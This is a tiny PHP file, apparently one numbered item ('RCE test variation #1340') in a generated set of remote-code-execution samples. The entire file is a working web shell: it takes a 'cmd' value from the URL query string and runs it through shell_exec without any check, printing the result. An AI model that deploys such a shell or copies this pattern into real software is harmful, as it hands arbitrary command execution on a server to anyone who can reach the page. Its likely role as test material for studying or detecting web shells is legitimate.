<?php
// RCE test variation #1340
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>